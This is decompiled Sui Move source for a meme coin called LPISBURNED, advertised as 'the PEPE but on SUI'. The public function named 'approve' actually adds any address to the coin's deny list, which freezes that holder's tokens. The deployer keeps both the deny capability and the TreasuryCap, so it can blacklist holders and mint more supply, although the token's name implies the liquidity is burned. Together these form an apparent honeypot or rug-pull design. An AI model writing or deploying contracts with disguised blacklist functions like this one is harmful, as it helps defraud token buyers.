module 0x40d6cc45a4976c52de2ec9a5e70e473bf30f12c456aa56a72bd0ac98e65bd570::lpisburned {
    struct LPISBURNED has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LPISBURNED>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LPISBURNED>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: LPISBURNED, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LPISBURNED>(arg0, 2, b"LPISBURNED", b"LPISBURNED", b"LPISBURNED IS THE PEPE BUT ON SUI", 0x1::option::none<0x2::url::Url>(), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LPISBURNED>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<LPISBURNED>(&mut v3, 100000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<LPISBURNED>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LPISBURNED>>(v1, v4);
    }

    // decompiled from Move bytecode v6
}

